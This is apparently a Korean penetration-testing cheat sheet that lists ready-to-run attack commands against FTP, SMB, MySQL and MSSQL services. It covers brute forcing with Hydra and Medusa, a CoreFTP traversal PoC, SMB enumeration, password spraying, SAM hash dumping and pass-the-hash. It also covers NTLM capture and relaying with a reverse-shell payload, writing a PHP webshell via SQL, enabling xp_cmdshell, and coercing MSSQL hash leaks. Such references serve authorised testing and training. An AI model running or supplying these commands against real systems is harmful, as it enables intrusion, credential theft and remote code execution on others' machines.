# 1. FTP

### Medusa를 이용한 Brute Forcing 
```medusa -u <user> -P /usr/share/wordlists/rockyou.txt -h 192.168.1.1 -M ftp ```

### Hydra를 이용한 Brute Forcing
```hydra -L users.list -P passwords.list ftp://192.168.1.1 -t 4```

### FTP 바운스 공격 (-b 플래그)
```nmap -Pn -v -n -p80 -b anonymous:password@192.168.1.1 172.16.0.1```

### CoreFTP Exploit (CVE-2022-22836)
```curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops```

<br/><br/>
# 2. SMB

### Null Session 파일공유
```smbclient -N -L //192.168.1.1```<br/>
```smbmap -H 192.168.1.1```<br/>
```smbmap -H 192.168.1.1 -r notes```<br/>
```smbmap -H 192.168.1.1 --download "notes\note.txt"```<br/>
```smbmap -H 192.168.1.1 --upload test.txt "notes\test.txt"```

### Remote Procedure Call (RPC)
```
rpcclient -U'%' 192.168.1.1
rpcclient $> enumdomusers
```

### Enum4linux 툴
```./enum4linux-ng.py 192.168.1.1 -A -C```

### CrackMapExec(CME)를 사용한 password spraying
```crackmapexec smb 192.168.1.1 -u /tmp/userlist.txt -p <password> --local-auth```
- ```--local-auth``` : 도메인에 가입되지 않은 호스트 대상
- ```--continue-on-success``` : 유효한 로그인 발견 후 계속 진행

### Impacket PsExec 툴
```impacket-psexec <user>:<password>@192.168.1.1```
- ```impacket-smbexec``` : psexec와 유사, 로컬SMB 서버를 인스턴스화하여 명령 출력을 수신
- ```impacket-atexec``` : 작업 스케줄러 서비스를 통해 명령 실행 및 출력 반환
<br/><br/>
## CrackMapExec(CME)

### CMD 또는 PowerShell 실행 (-X 또는 -x 옵션)
```crackmapexec smb 192.168.1.1 -u Administrator -p <password> -x 'whoami' --exec-method smbexec```

### Logged-on Users 열거 (예 : 네트워크 대역)
```crackmapexec smb 192.168.1.0/24 -u administrator -p <password> --loggedon-users```

### SAM Database에서 Hash 추출
```crackmapexec smb 192.168.1.1 -u administrator -p <password> --sam```

### Pass-the-Hash (PtH)
```crackmapexec smb 192.168.1.1 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE```

### NetNTLM v1/v2 hashes 캡쳐
```responder -I <interface name>```<br/>
로그 위치 : ```/usr/share/responder/logs/```<br/>
```hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt```

### Impacket-ntlmrelayx를 사용한 SAM Database에서 Hash 추출 
```impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.1.1```

### Impacket-ntlmrelayx를 사용한 명령 실행 (예 : Reverse Shell)
```impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>```

<br/><br/>
# 3. SQL Databases

## MySQL

### SQL Server에 연결
```mysql -u <user> -p<password> -h 192.168.1.1```

### Secure File Privileges 체크 (값이 비어 있으면 RW 가능)
```show variables like "secure_file_priv";```

### 로컬 파일 쓰기
```SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';```

### 로컬 파일 읽기
```select LOAD_FILE("/etc/passwd");```

<br/><br/>
## MSSQL

### SQL Server에 연결
```sqlcmd -S SRVMSSQL -U <user> -P <password> -y 30 -Y 30```<br/>
```sqsh -S 192.168.1.1 -U <user> -P <password> -h```<br/>
로컬 계정 : ```sqsh -S 192.168.1.1 -U .\\<user> -P <password> -h```<br/>
```mssqlclient.py -p 1433 <user>@192.168.1.1 -windows-auth```

### XP_CMDSHELL 활성화
```
EXECUTE sp_configure 'show advanced options', 1
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
xp_cmdshell 'whoami'
```

### 로컬 파일 읽기
```SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents```

### MSSQL Service Hash 캡쳐
- 먼저 `Responder`나 `impacket-smbserver`를 시작해야 함
```
EXEC master..xp_dirtree '\\192.168.1.1\share\'
  또는
EXEC master..xp_subdirs '\\10.10.110.17\share\'
```

### linked Servers 식별
```SELECT srvname, isremote FROM sysservers```
- `isremote`이 `1`은 원격 서버, `0`은 linked 서버를 의미
```EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]```
